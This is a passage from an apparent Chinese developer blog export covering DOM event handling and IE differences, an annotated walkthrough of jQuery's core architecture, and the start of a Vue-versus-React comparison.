的前两个参数完全相同。这意味着，给一个元素绑定匿名事件处理函数将无法被移除 IE8及以下addEventListener 和 removeEventListener 在IE8及以下不被支持 el.attachEvent(eventName, handle) 描述：给DOM元素添加指定的事件处理函数 参数： {String} eventName 事件名称 {Function} handle 事件函数 el.detachEvent(eventName, handle) 描述：移除通过 addEventListener 添加的事件处理函数 参数： {String} eventName 事件名称 {Function} handle 事件函数 对比attachEvent/detachEvent 与 addEventListener/removeEventListener 的区别： 由于IE8不支持事件捕获，所以通过 attachEvent/detachEvent 绑定的时间也只能在冒泡阶段触发 通过 attachEvent/detachEvent 绑定的事件函数会在全局作用域中运行，即： this === window 通过 attachEvent/detachEvent 绑定的事件函数以绑定时的先后顺序倒序被执行 attachEvent/detachEvent 的第一个参数要在事件名称前面加 ‘on’ 四、事件对象标准属性event.bubbles 读写特性：只读 描述：表示事件是否冒泡 event.cancelable 读写特性：只读 描述：表示事件是否可以取消事件默认行为 event.currentTarget 读写特性：只读 描述：currentTarget的值始终等于 this，即指向事件所绑定到的元素 event.target 读写特性：只读 描述：真正触发事件的元素 event.defaultPrevented 读写特性：只读 描述：为 true 表示已经调用了 preventDefault() event.detail 读写特性：只读 描述：与事件相关的细节信息 event.eventPhase 读写特性：只读 描述：调用该事件处理函数的阶段 1 表示捕获阶段 2 表示处于目标阶段 3 表示冒泡阶段 event.trusted 读写特性：只读 描述：为true表示事件是由浏览器生成的，false表示事件是由人工使用JavaScript创建的 event.type 读写特性：只读 描述：事件类型 event.type 读写特性：只读 描述：事件类型 方法event.preventDefault() 描述：阻止事件的默认行为 只有 event.cancelable 属性为 true 的事件，才能够通过 preventDefault() 方法取消默认行为 event.stopImmediatePropagation() 描述：与 event.stopPropagation() 一样，可以阻止事件冒泡，除此之外，还能阻止执行该语句之后的所有事件监听 IE特有IE中获取事件对象的方法IE中获取事件对象的方法与绑定事件的方式有关 1、DOM0级绑定事件的方式，即 el.onclick = function () {}，其事件对象通过window获取： 123el.onclick = function () &#123; window.event&#125; 2、DOM2级绑定事件对象的方式，即 el.attachEvent(&#39;click&#39;, function (event) {})，既可以通过window获取，也可以通过event参数获取： 12345el.attachEvent('click', function (event) &#123; window.event // 或 event&#125;) 属性event.srcElement 读写特性：只读 描述：与规范中的 event.target 属性相同。 event.returnValue 读写 描述：默认为 true，如果将其设为 false 即可取消事件默认行为，相当于规范中的：event.preventDefault() event.cancelBubble 读写 描述：默认为 false ，如果设为 true 即可取消事件冒泡，相当于规范中的：event.stopPropagation() 事件总结在规范中，事件处理函数的this对象始终等于 event.currentTarget 属性，但在IE中就不一定。比如：使用 attachEvent 绑定的事件处理函数是在全局作用域中运行的，所以this对象指向window，而不是 event.srcElement 对照表12345| standard | IE || ------------- | ------------- || target | srcElement || preventDefault() | returnValue = false || stopPropagation() | cancelBubble = true | 五、事件类型及讲解UI事件load1234567window上触发： 当页面完全加载完，包括所有图像、js文件、css文件、&lt;object&gt;内嵌对象等等&lt;img&gt;图片： 当图片加载完成后触发&lt;script&gt;/&lt;link&gt;： 当js文件或css文件加载成功后 注意：&lt;script&gt;标签只能使用HTML内联属性添加事件的方式才能生效 resize12window上触发： 当窗口大小改变时 scroll1234window上触发： 当滚动页面时在可滚动元素上触发： 当滚动可滚动的元素时 焦点事件focus当元素获得焦点时触发，不冒泡，但是可以在捕获阶段触发 blur当元素失去焦点时触发，不冒泡，但是可以在捕获阶段触发 鼠标与滚轮事件click点击鼠标左键时触发 dblclick双击鼠标左键 mousedown按下鼠标任意按钮时触发 mouseup释放鼠标按钮时触发 mouseenter/mouseleave 与 mouseover/mouseout 的区别1234567891011121314151617181920212223242526272829303132333435363738394041424344454647mouseenter 只会在鼠标在元素外部进入元素内部时触发，如果该元素有子节点，当移入其子节点内部时，会在捕获阶段在该节点触发，当鼠标再从子节点移出到该节点时，不会再触发。父元素绑定事件，子元素溢出父元素，括号的数字代表 event.eventPhase 的值1、先移入子元素 mouseover: 事件在捕获阶段触发一次（1） mouseenter: Firefox、chrome 先在 处于目标阶段触发一次 再在 捕获阶段触发一次（2-1） Safari 先在 捕获阶段触发 再在 处于目标阶段触发 （1-2）1.2、从子元素直接移出到父元素 mouseover: 事件在处于目标阶段触发（2） mouseenter: 不触发事件1.3、再从父元素直接移动到子元素 mouseover: 在捕获阶段触发（1） mouseenter: 在捕获阶段触发（1）2、先移入父元素 mouseover: 在处于目标阶段触发（2） mouseenter: 在处于目标阶段触发（2）2.1、再从父元素直接移动到子元素 mouseover: 在捕获阶段触发（1） mouseenter: 在捕获阶段触发（1）总结： 大前提：父元素绑定事件，子元素溢出父元素。如果只考虑在目标阶段触发的话，即 event.eventPhase 的值为2时，不妨把子元素覆盖的区域当做附加区，那么： mouseover触发时机: 鼠标从外部移入该元素，或从附加区移入该元素 mouseout触发时机: 鼠标从该元素移到外部，或从该元素移到附加区 mouseenter触发时机: 鼠标从外部移入附加区，或从外部移入该元素 mouseleave触发时机: 鼠标从附加区移入外部，或从该元素移入外部 mouseover 和 mouseout 的作用区域 = 该元素区域 - (该元素 与 附加区交集) mouseenter 和 mouseleave 的作用区域 = 该元素区域 和 附加区并集 mouseover 先于 mouseenter mouseout 先于 mouseleave 鼠标事件 只有 mouseenter 和 mouseleave 不冒泡（但是可以在捕获阶段触发）mouseover 和 mouseout 的相关元素： 1、标准 event.relatedTarget 2、IE8及以下 event.fromElement event.toElement 鼠标事件对象中的位置信息： 客户区坐标位置 event.clientX/Y 页面坐标位置 event.pageX/Y 注意：IE8及以下版本不支持 pageX/Y，不过可以通过 clientX/Y + scrollLeft/Top 计算 屏幕坐标位置（相对电脑屏幕的坐标位置） event.screenX/Y 修改键1234event.shiftKey // 按住 shift 键为trueevent.ctrlKey // 按住 Ctrl 键为trueevent.altKey // 按住 alt 键为trueevent.metaKey // Mac下按住 command 键为true，windows 按住 Windows 键为true 注意：IE8及以下不支持 metaKey 键盘事件keydown按下键盘任意键时触发 keypress按下键盘任意字符键时触发 keyup松开键盘任意键时触发 可以通过 event.keyCode 获取键码 文本事件textInput输入框，文本在插入输入框之前触发，event.data 按下的字符 HTML5事件contextmenu鼠标右键事件，常用于制定自定义菜单 beforeunload在页面卸载之前触发，用来询问用户是否真的要离开该页面 该事件在window上触发，调用此方法的必须将 提示信息设置为 event.returnValue 的值，并return 该值 示例： 1234window.addEventListener('beforeunload', function (event) &#123; event.returnValue = 'what?' return 'what?'&#125;, false) DOMcontentLoaded形成完整DOM树之后触发 注意：IE8及以下不支持 pageshow页面显示时触发，load 事件只会在第一次加载页面是触发，之后页面会被 bfcache（往返缓存）管理，通过前进后退按钮来显示页面时，load 事件并不会触发，但是 pageshow 事件会触发 pagehide页面卸载时触发。 注意：pageshow/pagehide 必须添加到 window对象上 hashchange# 号后面的字符串发生变化时，在window对象上触发。]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>DOM</tag>
        <tag>事件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery_源码分析_整体架构]]></title>
    <url>%2F2018%2F04%2F17%2FjQuery-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[本篇主要讲 jQuery 的整体架构及一些前期准备，先来看看 jQuery 的整体结构： jQuery 整体结构 不同于 jQuery 代码各个模块细节实现的晦涩难懂，jQuery 整体框架的结构十分清晰，按代码行文大致分为如上图所示的模块。 初看 jQuery 源码可能很容易一头雾水，因为 9000 行的代码感觉没有尽头，所以了解作者的行文思路十分重要。 整体而言，我觉得 jQuery 采用的是总–分的结构，虽然JavaScript有着作用域的提升机制，但是 9000 多行的代码为了相互的关联性，并不代表所有的变量都要定义在最顶部。在 jQuery 中，只有全局都会用到的变量、正则表达式定义在了代码最开头，而每个模块一开始，又会定义一些只在本模块会使用到的变量、正则、方法等。所以在一开始的阅读的过程中会有很多看不懂其作用的变量，正则，方法。 所以，我觉得阅读源码很重要的一点是，摒弃面向过程的思维方式，不要刻意去追求从上至下每一句都要在一开始弄明白。很有可能一开始你在一个奇怪的方法或者变量处卡壳了，很想知道这个方法或变量的作用，然而可能它要到几千行处才被调用到。如果去追求这种逐字逐句弄清楚的方式，很有可能在碰壁几次之后阅读的积极性大受打击。 道理说了很多，接来下进入真正的正文，对 jQurey 的一些前期准备，小的细节进行分析： jQuery闭包结构1234567// 用一个函数域包起来，就是所谓的沙箱// 在这里边 var 定义的变量，属于这个函数域内的局部变量，避免污染全局// 把当前沙箱需要的外部变量通过函数参数引入进来// 只要保证参数对内提供的接口的一致性，你还可以随意替换传进来的这个参数(function(window, undefined) &#123; // jQuery 代码&#125;)(window); jQuery 具体的实现，都被包含在了一个立即执行函数构造的闭包里面，为了不污染全局作用域，只在后面暴露 $ 和 jQuery 这 2 个变量给外界，尽量的避开变量冲突。常用的还有另一种写法：123(function(window) &#123; // JS代码&#125;)(window, undefined); 比较推崇的的第一种写法，也就是 jQuery 的写法。二者有何不同呢，当我们的代码运行在更早期的环境当中（pre-ES5，eg. Internet Explorer 8），undefined 仅是一个变量且它的值是可以被覆盖的。意味着你可以做这样的操作：12undefined = 42console.log(undefined) // 42 当使用第一种方式，可以确保你需要的 undefined 确实就是 undefined。 另外不得不提出的是，jQuery 在这里有一个针对压缩优化细节，使用第一种方式，在代码压缩的时候，window 和 undefined 都可以压缩为 1 个字母并且确保它们就是 window 和 undefined。12345// 压缩策略// w -&gt; windwow , u -&gt; undefined(function(w, u) &#123;&#125;)(window); jQuery 无 new 构造嘿，回想一下使用 jQuery 的时候，实例化一个 jQuery 对象的方法：123456// 无 new 构造$('#test').text('Test');// 当然也可以使用 newvar test = new $('#test');test.text('Test'); 大部分人使用 jQuery 的时候都是使用第一种无 new 的构造方式，直接 $(&#39;&#39;) 进行构造，这也是 jQuery 十分便捷的一个地方。当我们使用第一种无 new 构造方式的时候，其本质就是相当于 new jQuery()，那么在 jQuery 内部是如何实现的呢？看看：12345678910111213141516171819202122232425(function(window, undefined) &#123; var // ... jQuery = function(selector, context) &#123; // The jQuery object is actually just the init constructor 'enhanced' // 看这里，实例化方法 jQuery() 实际上是调用了其拓展的原型方法 jQuery.fn.init return new jQuery.fn.init(selector, context, rootjQuery); &#125;, // jQuery.prototype 即是 jQuery 的原型，挂载在上面的方法，即可让所有生成的 jQuery 对象使用 jQuery.fn = jQuery.prototype = &#123; // 实例化化方法，这个方法可以称作 jQuery 对象构造器 init: function(selector, context, rootjQuery) &#123; // ... &#125; &#125; // 这一句很关键，也很绕 // jQuery 没有使用 new 运算符将 jQuery 实例化，而是直接调用其函数 // 要实现这样,那么 jQuery 就要看成一个类，且返回一个正确的实例 // 且实例还要能正确访问 jQuery 类原型上的属性与方法 // jQuery 的方式是通过原型传递解决问题，把 jQuery 的原型传递给jQuery.prototype.init.prototype // 所以通过这个方法生成的实例 this 所指向的仍然是 jQuery.fn，所以能正确访问 jQuery 类原型上的属性与方法 jQuery.fn.init.prototype = jQuery.fn;&#125;)(window); 大部分人初看 jQuery.fn.init.prototype = jQuery.fn 这一句都会被卡主，很是不解。但是这句真的算是 jQuery 的绝妙之处。理解这几句很重要，分点解析一下： 1）首先要明确，使用 $(&#39;xxx&#39;) 这种实例化方式，其内部调用的是 return new jQuery.fn.init(selector, context, rootjQuery) 这一句话，也就是构造实例是交给了 jQuery.fn.init() 方法去完成。 2）将 jQuery.fn.init 的 prototype 属性设置为 jQuery.fn，那么使用 new jQuery.fn.init() 生成的对象的原型对象就是 jQuery.fn ，所以挂载到 jQuery.fn 上面的函数就相当于挂载到 jQuery.fn.init() 生成的 jQuery 对象上，所有使用 new jQuery.fn.init() 生成的对象也能够访问到 jQuery.fn 上的所有原型方法。 3）也就是实例化方法存在这么一个关系链 jQuery.fn.init.prototype = jQuery.fn = jQuery.prototype ;new jQuery.fn.init() 相当于 new jQuery();jQuery() 返回的是 new jQuery.fn.init()，而 var obj = new jQuery()，所以这 2 者是相当的，所以我们可以无 new 实例化 jQuery 对象。 jQuery 方法重载jQuery 源码晦涩难读的另一个原因是，使用了大量的方法重载，但是用起来却很方便：123456789// 获取 title 属性的值$('#id').attr('title');// 设置 title 属性的值$('#id').attr('title','jQuery');// 获取 css 某个属性的值$('#id').css('title');// 设置 css 某个属性的值$('#id').css('width','200px'); 方法的重载即是一个方法实现多种功能，经常又是 get 又是 set，虽然阅读起来十分不易，但是从实用性的角度考虑，这也是为什么 jQuery 如此受欢迎的原因，大多数人使用 jQuery() 构造方法使用的最多的就是直接实例化一个 jQuery 对象，但其实在它的内部实现中，有着 9 种不同的方法重载场景：1234567891011121314151617// 接受一个字符串，其中包含了用于匹配元素集合的 CSS 选择器jQuery([selector,[context]])// 传入单个 DOMjQuery(element)// 传入 DOM 数组jQuery(elementArray)// 传入 JS 对象jQuery(object)// 传入 jQuery 对象jQuery(jQuery object)// 传入原始 HTML 的字符串来创建 DOM 元素jQuery(html,[ownerDocument])jQuery(html,[attributes])// 传入空参数jQuery()// 绑定一个在 DOM 文档载入完成后执行的函数jQuery(callback) 所以读源码的时候，很重要的一点是结合 jQuery API 进行阅读，去了解方法重载了多少种功能，同时我想说的是，jQuery 源码有些方法的实现特别长且繁琐，因为 jQuery 本身作为一个通用性特别强的框架，一个方法兼容了许多情况，也允许用户传入各种不同的参数，导致内部处理的逻辑十分复杂，所以当解读一个方法的时候感觉到了明显的困难，尝试着跳出卡壳的那段代码本身，站在更高的维度去思考这些复杂的逻辑是为了处理或兼容什么，是否是重载，为什么要这样写，一定会有不一样的收获。其次，也是因为这个原因，jQuery 源码存在许多兼容低版本的 HACK 或者逻辑十分晦涩繁琐的代码片段，浏览器兼容这样的大坑极其容易让一个前端工程师不能学到编程的精髓，所以不要太执着于一些边角料，即使兼容性很重要，也应该适度学习理解，适可而止。 jQuery.fn.extend 与 jQuery.extendextend 方法在 jQuery 中是一个很重要的方法，jQuery 内部用它来扩展静态方法或实例方法，而且我们开发 jQuery 插件开发的时候也会用到它。但是在内部，是存在 jQuery.fn.extend 和 jQuery.extend 两个 extend 方法的，而区分这两个 extend 方法是理解 jQuery 的很关键的一部分。先看结论： 1）jQuery.extend(object) 为扩展 jQuery 类本身，为类添加新的静态方法； 2）jQuery.fn.extend(object) 给 jQuery 对象添加实例方法，也就是通过这个 extend 添加的新方法，实例化的 jQuery 对象都能使用，因为它是挂载在 jQuery.fn 上的方法（上文有提到，jQuery.fn = jQuery.prototype ）。 它们的官方解释是： 1）jQuery.extend(): 把两个或者更多的对象合并到第一个当中， 2）jQuery.fn.extend()：把对象挂载到 jQuery 的 prototype 属性，来扩展一个新的 jQuery 实例方法。 也就是说，使用 jQuery.extend() 拓展的静态方法，我们可以直接使用 $.xxx 进行调用（xxx是拓展的方法名）， 而使用 jQuery.fn.extend() 拓展的实例方法，需要使用 $().xxx 调用。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798// 扩展合并函数// 合并两个或更多对象的属性到第一个对象中，jQuery 后续的大部分功能都通过该函数扩展// 虽然实现方式一样，但是要注意区分用法的不一样，那么为什么两个方法指向同一个函数实现，但是却实现不同的功能呢,// 阅读源码就能发现这归功于 this 的强大力量// 如果传入两个或多个对象，所有对象的属性会被添加到第一个对象 target// 如果只传入一个对象，则将对象的属性添加到 jQuery 对象中，也就是添加静态方法// 用这种方式，我们可以为 jQuery 命名空间增加新的方法，可以用于编写 jQuery 插件// 如果不想改变传入的对象，可以传入一个空对象：$.extend(&#123;&#125;, object1, object2);// 默认合并操作是不迭代的，即便 target 的某个属性是对象或属性，也会被完全覆盖而不是合并// 如果第一个参数是 true，则是深拷贝// 从 object 原型继承的属性会被拷贝，值为 undefined 的属性不会被拷贝// 因为性能原因，JavaScript 自带类型的属性不会合并jQuery.extend = jQuery.fn.extend = function() &#123; var src, copyIsArray, copy, name, options, clone, target = arguments[0] || &#123;&#125;, i = 1, length = arguments.length, deep = false; // Handle a deep copy situation // target 是传入的第一个参数 // 如果第一个参数是布尔类型，则表示是否要深递归， if (typeof target === "boolean") &#123; deep = target; target = arguments[1] || &#123;&#125;; // skip the boolean and the target // 如果传了类型为 boolean 的第一个参数，i 则从 2 开始 i = 2; &#125; // Handle case when target is a string or something (possible in deep copy) // 如果传入的第一个参数是 字符串或者其他 if (typeof target !== "object" &amp;&amp; !jQuery.isFunction(target)) &#123; target = &#123;&#125;; &#125; // extend jQuery itself if only one argument is passed // 如果参数的长度为 1 ，表示是 jQuery 静态方法 if (length === i) &#123; target = this; --i; &#125; // 可以传入多个复制源 // i 是从 1或2 开始的 for (; i &lt; length; i++) &#123; // Only deal with non-null/undefined values // 将每个源的属性全部复制到 target 上 if ((options = arguments[i]) != null) &#123; // Extend the base object for (name in options) &#123; // src 是源（即本身）的值 // copy 是即将要复制过去的值 src = target[name]; copy = options[name]; // Prevent never-ending loop // 防止有环，例如 extend(true, target, &#123;'target':target&#125;); if (target === copy) &#123; continue; &#125; // Recurse if we're merging plain objects or arrays // 这里是递归调用，最终都会到下面的 else if 分支 // jQuery.isPlainObject 用于测试是否为纯粹的对象 // 纯粹的对象指的是 通过 "&#123;&#125;" 或者 "new Object" 创建的 // 如果是深复制 if (deep &amp;&amp; copy &amp;&amp; (jQuery.isPlainObject(copy) || (copyIsArray = jQuery.isArray(copy)))) &#123; // 数组 if (copyIsArray) &#123; copyIsArray = false; clone = src &amp;&amp; jQuery.isArray(src) ? src : []; // 对象 &#125; else &#123; clone = src &amp;&amp; jQuery.isPlainObject(src) ? src : &#123;&#125;; &#125; // Never move original objects, clone them // 递归 target[name] = jQuery.extend(deep, clone, copy); // Don't bring in undefined values // 最终都会到这条分支 // 简单的值覆盖 &#125; else if (copy !== undefined) &#123; target[name] = copy; &#125; &#125; &#125; &#125; // Return the modified object // 返回新的 target // 如果 i &lt; length ，是直接返回没经过处理的 target，也就是 arguments[0] // 也就是如果不传需要覆盖的源，调用 $.extend 其实是增加 jQuery 的静态方法 return target;&#125;; 需要注意的是这一句 jQuery.extend = jQuery.fn.extend = function() {} ，也就是 jQuery.extend 的实现和 jQuery.fn.extend 的实现共用了同一个方法，但是为什么能够实现不同的功能了，这就要归功于 Javascript 强大（怪异？）的 this 了。 1）在 jQuery.extend() 中，this 的指向是 jQuery 对象(或者说是 jQuery 类)，所以这里扩展在 jQuery 上； 2）在 jQuery.fn.extend() 中，this 的指向是 fn 对象，前面有提到 jQuery.fn = jQuery.prototype ，也就是这里增加的是原型方法，也就是对象方法。 jQuery 的链式调用及回溯另一个让大家喜爱使用 jQuery 的原因是它的链式调用，这一点的实现其实很简单，只需要在要实现链式调用的方法的返回结果里，返回 this ，就能够实现链式调用了。 当然，除了链式调用，jQuery 甚至还允许回溯，看看：12// 通过 end() 方法终止在当前链的最新过滤操作，返回上一个对象集合$('div').eq(0).show().end().eq(1).hide(); 当选择了 (‘div’).eq(0) 之后使用 end() 可以回溯到上一步选中的 jQuery 对象 $(‘div’)，其内部实现其实是依靠添加了 prevObject 这个属性：jQuery 完整的链式调用、增栈、回溯通过 return this 、 return this.pushStack() 、return this.prevObject 实现，看看源码实现：123456789101112131415161718192021222324252627282930313233343536jQuery.fn = jQuery.prototype = &#123; // 将一个 DOM 元素集合加入到 jQuery 栈 // 此方法在 jQuery 的 DOM 操作中被频繁的使用, 如在 parent(), find(), filter() 中 // pushStack() 方法通过改变一个 jQuery 对象的 prevObject 属性来跟踪链式调用中前一个方法返回的 DOM 结果集合 // 当我们在链式调用 end() 方法后, 内部就返回当前 jQuery 对象的 prevObject 属性 pushStack: function(elems) &#123; // 构建一个新的jQuery对象，无参的 this.constructor()，只是返回引用this // jQuery.merge 把 elems 节点合并到新的 jQuery 对象 // this.constructor 就是 jQuery 的构造函数 jQuery.fn.init，所以 this.constructor() 返回一个 jQuery 对象 // 由于 jQuery.merge 函数返回的对象是第二个函数附加到第一个上面，所以 ret 也是一个 jQuery 对象，这里可以解释为什么 pushStack 出入的 DOM 对象也可以用 CSS 方法进行操作 var ret = jQuery.merge(this.constructor(), elems); // 给返回的新 jQuery 对象添加属性 prevObject // 所以也就是为什么通过 prevObject 能取到上一个合集的引用了 ret.prevObject = this; ret.context = this.context; // Return the newly-formed element set return ret; &#125;, // 回溯链式调用的上一个对象 end: function() &#123; // 回溯的关键是返回 prevObject 属性 // 而 prevObject 属性保存了上一步操作的 jQuery 对象集合 return this.prevObject || this.constructor(null); &#125;, // 取当前 jQuery 对象的第 i 个 eq: function(i) &#123; // jQuery 对象集合的长度 var len = this.length, j = +i + (i &lt; 0 ? len : 0); // 利用 pushStack 返回 return this.pushStack(j &gt;= 0 &amp;&amp; j &lt; len ? [this[j]] : []); &#125;,&#125; 总的来说， 1）end() 方法返回 prevObject 属性，这个属性记录了上一步操作的 jQuery 对象合集； 2）而 prevObject 属性由 pushStack() 方法生成，该方法将一个 DOM 元素集合加入到 jQuery 内部管理的一个栈中，通过改变 jQuery 对象的 prevObject 属性来跟踪链式调用中前一个方法返回的 DOM 结果集合 3）当我们在链式调用 end() 方法后，内部就返回当前 jQuery 对象的 prevObject 属性，完成回溯。 jQuery 正则与细节优化不得不提 jQuery 在细节优化上做的很好。也存在很多值得学习的小技巧，下一篇将会以 jQuery 中的一些编程技巧为主题行文，这里就不再赘述。 然后想谈谈正则表达式，jQuery 当中用了大量的正则表达式，我觉得如果研读 jQuery ，正则水平一定能够大大提升，如果是个正则小白，我建议在阅读之前先去了解以下几点： 1）了解并尝试使用 Javascript 正则相关 API，包括了 test() 、replace()、match() 、exec() 的用法； 2）区分上面 4 个方法，哪个是 RegExp 对象方法，哪个是 String 对象方法； 3）了解简单的零宽断言，了解什么是匹配但是不捕获以及匹配并且捕获。 jQuery 变量冲突处理最后想提一提 jQuery 变量的冲突处理，通过一开始保存全局变量的 window.jQuery 以及 windw.$ 。 当需要处理冲突的时候，调用静态方法 noConflict()，让出变量的控制权，源码如下：123456789101112131415161718192021222324252627282930(function(window, undefined) &#123; var // Map over jQuery in case of overwrite // 设置别名，通过两个私有变量映射了 window 环境下的 jQuery 和 $ 两个对象，以防止变量被强行覆盖 _jQuery = window.jQuery, _$ = window.$; jQuery.extend(&#123; // noConflict() 方法让出变量 $ 的 jQuery 控制权，这样其他脚本就可以使用它了 // 通过全名替代简写的方式来使用 jQuery // deep -- 布尔值，指示是否允许彻底将 jQuery 变量还原(移交 $ 引用的同时是否移交 jQuery 对象本身) noConflict: function(deep) &#123; // 判断全局 $ 变量是否等于 jQuery 变量 // 如果等于，则重新还原全局变量 $ 为 jQuery 运行之前的变量（存储在内部变量 _$ 中） if (window.$ === jQuery) &#123; // 此时 jQuery 别名 $ 失效 window.$ = _$; &#125; // 当开启深度冲突处理并且全局变量 jQuery 等于内部 jQuery，则把全局 jQuery 还原成之前的状况 if (deep &amp;&amp; window.jQuery === jQuery) &#123; // 如果 deep 为 true，此时 jQuery 失效 window.jQuery = _jQuery; &#125; // 这里返回的是 jQuery 库内部的 jQuery 构造函数（new jQuery.fn.init()） // 像使用 $ 一样尽情使用它吧 return jQuery; &#125; &#125;)&#125;(window) 那么让出了这两个符号之后，是否就不能在我们的代码中使用 jQuery 或者呢 $ 呢？莫慌，还是可以使用的：123456789// 让出 jQuery 、$ 的控制权不代表不能使用 jQuery 和 $ ，方法如下：var query = jQuery.noConflict(true);(function($) &#123;// 插件或其他形式的代码，也可以将参数设为 jQuery&#125;)(query);// ... 其他用 $ 作为别名的库的代码 结束语对 jQuery 整体架构的一些解析就到这里，下一篇将会剖析一下 jQuery 中的一些优化小技巧，一些对编程有所提高的地方。 jQuery_源码分析_奇淫技巧]]></content>
      <categories>
        <category>jQuery</category>
      </categories>
      <tags>
        <tag>源码</tag>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React_react和vue的差别]]></title>
    <url>%2F2018%2F04%2F17%2FReact-react%E5%92%8Cvue%E7%9A%84%E5%B7%AE%E5%88%AB%2F</url>
    <content type="text"><![CDATA[Vue与React的对比Vue.js与React.js从某些反面来说很相似，通过两个框架的学习，有时候对一些用法会有一点思考，为加深学习的思索，特翻阅了两个文档，从以下各方面进行了对比，加深了对这两个框架的认知。 1.数据绑定1.1 Vue中有关数据绑定的部分 vue是双向绑定， Vue.js 最核心的功能有两个，一是响应式的数据绑定系统，二是组件系统。所谓双向绑定，指的是Vue实例中的data与其渲染的DOM元素的内容保持一致，无论谁被改变，另一方会相应的更新为相同的数据。这是通过设置属性访问器实现的。 在Vue中，与数据绑定有关的有 插值表达式、指令系统、*Class和Style、事件处理器和表单空间、ajax请求和计算属性 1.1.1插值表达式插值和指令又称为模板语法 数据绑定最常见的形式就是使用“Mustache”语法 (双大括号) 的文本插值 Mustache 语法不能作用在 HTML 特性上，遇到这种情况应该使用 v-bind 指令 1.1.2 指令 Vue中的指令很方便，指令 (Directives) 是带有 v- 前缀的特殊属性。指令属性的值预期是单个 JavaScript 表达式 (v-for 是例外情况，稍后我们再讨论)。指令的职责是，当表达式的值改变时，将其产生的连带影响，响应式地作用于 DOM。 Vue中的12个指令： v-bind,v-once,v-model,v-text,v-html,v-on,v-if,v-else,v-show,v-for,v-pre,v-clock 1.1.3 class与style绑定 数据绑定的一个常见需求是操作元素的 class 列表和它的内联样式。因为它们都是属性 ，我们可以用v-bind处理它们：只需要计算出表达式最终的字符串。不过，字符串拼接麻烦又易错。因此，在v-bind用于class和style时，Vue.js` 专门增强了它。表达式的结果类型除了字符串之外，还可以是对象或数组。 对象语法 我们可以传给 v-bind:class 一个对象，以动态地切换 class 数组语法 我们可以把一个数组传给 v-bind:class，以应用一个 class 列表： 1&lt;div v-bind:class="[activeClass, errorClass]"&gt;&lt;/div&gt; 1.1.4 条件渲染和列表渲染 v-if条件渲染一组数 我们用 v-for 指令根据一组数组的选项列表进行渲染。v-for 指令需要使用 item in items 形式的特殊语法，items 是源数据数组并且 item 是数组元素迭代的别名。 1.1.5 事件处理器 通过v-on给元素注册事件 使用 v-on 有几个好处： 扫一眼 HTML 模板便能轻松定位在 JavaScript 代码里对应的方法。 因为你无须在 JavaScript 里手动绑定事件，你的 ViewModel 代码可以是非常纯粹的逻辑，和 DOM 完全解耦，更易于测试。 当一个 ViewModel 被销毁时，所有的事件处理器都会自动被删除。你无须担心如何自己清理它们。 1.1.6 表单控件 v-model在表单控件元素上创建双向数据绑定 它会根据控件类型自动选取正确的方法来更新元素。 1.1.7 计算属性 在Vue中引入了计算属性来处理模板中放入太多的逻辑会让模板过重且难以维护的问题，这样不但解决了上面的问题，而且也同时让模板和业务逻辑更好的分离。 简单来说，假如data里面有属性a=1，然后你需要一个变量跟着a变化，例如b=a+1，那么就需要用到计算属性，Vue实例的computed属性中，设置b为其属性，其表现为一个函数，返回值是b的值。 1.1.8 ajax数据请求 vue2.0中数据请求推荐使用axios 注： 关于vue的数据双向绑定和单向数据流 Vue 的依赖追踪是【原理上不支持双向绑定，v-model 只是通过监听 DOM 事件实现的语法糖】 Vue的依赖追踪是通过 Object.defineProperty 把data对象的属性全部转为 getter/setter来实现的；当改变数据的某个属性值时，会触发set函数,获取该属性值的时候会触发get函数，通过这个特性来实现改变数据时改变视图；也就是说只有当数据改变时才会触发视图的改变，反过来在操作视图时，只能通过DOM事件来改变数据，再由此来改变视图，以此来实现双向绑定 双向绑定是在同一个组件内，将数据和视图绑定起来，和父子组件之间的通信并无什么关联； 组件之间的通信采用单向数据流是为了组件间更好的解耦，在开发中可能有多个子组件依赖于父组件的某个数据，假如子组件可以修改父组件数据的话，一个子组件变化会引发所有依赖这个数据的子组件发生变化，所以vue不推荐子组件修改父组件的数据，直接修改props会抛出警告 1.2 react没有数据双向绑定 react是单向数据流 react中通过将state（Model层）与View层数据进行双向绑定达数据的实时更新变化，具体来说就是在View层直接写JS代码Model层中的数据拿过来渲染，一旦像表单操作、触发事件、ajax请求等触发数据变化，则进行双同步 1.2.1事件处理 React 元素的事件处理和 DOM元素的很相似。但是有一点语法上的不同: React事件绑定属性的命名采用驼峰式写法，而不是小写。 如果采用 JSX 的语法你需要传入一个函数作为事件处理函数，而不是一个字符串(DOM元素的写法) 在 React 中另一个不同是你不能使用返回 false 的方式阻止默认行为。你必须明确的使用 preventDefault。 当你使用 ES6 class 语法来定义一个组件的时候，事件处理器会成为类的一个方法。一般需要显式的绑定this，例如 this.handleClick = this.handleClick.bind(this); 你必须谨慎对待 JSX 回调函数中的 this，类的方法默认是不会绑定 this 的。如果你忘记绑定 this.handleClick 并把它传入 onClick, 当你调用这个函数的时候 this 的值会是 undefined。 1.2.2 条件渲染 React 中的条件渲染和 JavaScript 中的一致，使用 JavaScript 操作符 if 或条件运算符来创建表示当前状态的元素，然后让 React 根据它们来更新 UI。 你可以通过用花括号包裹代码在 JSX 中嵌入任何表达式 ，也包括 JavaScript 的逻辑与 &amp;&amp;，它可以方便地条件渲染一个元素。之所以能这样做，是因为在 JavaScript 中，true &amp;&amp; expression 总是返回 expression，而 false &amp;&amp; expression 总是返回 false。因此，如果条件是 true，&amp;&amp; 右侧的元素就会被渲染，如果是 false，React 会忽略并跳过它。 条件渲染的另一种方法是使用 JavaScript 的条件运算符 condition ? true : false。 1.2.3 列表渲染 你可以通过使用{}在JSX内构建一个元素集合，使用Javascript中的map()方法循遍历数组 Keys可以在DOM中的某些元素被增加或删除的时候帮助React识别哪些元素发生了变化。因此你应当给数组中的每一个元素赋予一个确定的标识。一个元素的key最好是这个元素在列表中拥有的一个独一无二的字符串。通常，我们使用来自数据的id作为元素的key。 1.2.4 表单操作 HTML表单元素与React中的其他DOM元素有所不同,因为表单元素生来就保留一些内部状态。 